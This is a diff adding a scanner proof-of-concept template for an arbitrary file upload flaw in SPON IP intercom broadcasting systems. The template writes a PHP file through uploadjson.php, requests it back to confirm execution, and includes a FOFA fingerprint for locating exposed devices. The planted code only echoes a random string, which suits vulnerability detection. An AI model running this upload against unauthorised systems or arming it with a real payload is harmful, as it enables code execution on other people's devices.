@@ -1,0 +1,47 @@
+id: poc-yaml-spon-ip-internet-intercom-broadcasting-system-uploadjson-php-anyfile-upload
+info:
+  name: SPON IP Network Intercom Broadcasting System uploadjson.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    finger: SPON IP Network Intercom Broadcasting System
+    fofa: icon_hash="-1830859634"
+variables:
+  filename: "{{rand_text_alphanumeric(6)}}"
+  content: "{{rand_text_alphanumeric(32)}}"
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/php/uploadjson.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: |
+      jsondata[filename]={{filename}}.php&jsondata[data]=<?php echo '{{content}}';?>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{\"res\":\"1\"}"
+        part: body
+      - type: word
+        words:
+          - "text/html"
+        part: header
+  - id: validate-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/lan/{{filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{content}}"
+        part: body
